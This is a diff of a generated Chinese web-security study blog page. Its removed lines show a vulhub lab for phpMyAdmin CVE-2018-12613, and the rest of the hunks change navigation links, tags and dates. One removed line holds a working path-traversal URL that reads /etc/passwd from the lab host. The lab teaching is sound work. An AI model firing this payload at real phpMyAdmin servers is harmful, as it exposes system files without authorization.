-Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.
-
-MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>
-</code></pre>
-<h4 id="4、某第三方应用安全漏洞演示"><a href="#4、某第三方应用安全漏洞演示" class="headerlink" title="4、某第三方应用安全漏洞演示"></a><font size="4"><strong>4、某第三方应用安全漏洞演示</strong></font></h4><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a><br>环境搭建</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># pwd</span>
-/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613
-<span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span>
-</code></pre>
-<p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/3.png"></p>
-<p>漏洞利用<br><a href="http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd">http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></p>
-<p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/4.png"></p>
-<h3 id="五、涉及资源："><a href="#五、涉及资源：" class="headerlink" title="五、涉及资源："></a><font size="5"><strong>五、涉及资源：</strong></font></h3><p><a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a><br><a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a><br><a target="_blank" rel="noopener" href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>
-
+                
                 
             </div>
             <hr/>
@@ -773,7 +519,7 @@ MySQL <span class="token punctuation">[</span><span class="token punctuation">(<
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/">http://example.com/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/</a>
+                    <a href="http://example.com/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/">http://example.com/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -810,11 +556,7 @@ MySQL <span class="token punctuation">[</span><span class="token punctuation">(<
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -987,7 +729,45 @@ MySQL <span class="token punctuation">[</span><span class="token punctuation">(<
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/">
+                <a href="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="web安全日志-006">
+                        
+                        <span class="card-title">web安全日志-006</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            爱睡懒觉的道士
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/">
                     <div class="card-image">
                         
                         
@@ -1004,57 +784,7 @@ MySQL <span class="token punctuation">[</span><span class="token punctuation">(<
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-17
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    web安全
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="web安全日志-004">
-                        
-                        <span class="card-title">web安全日志-004</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            基础入门-WEB源码拓展
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-18
                             </span>
                         <span class="publish-author">
                             
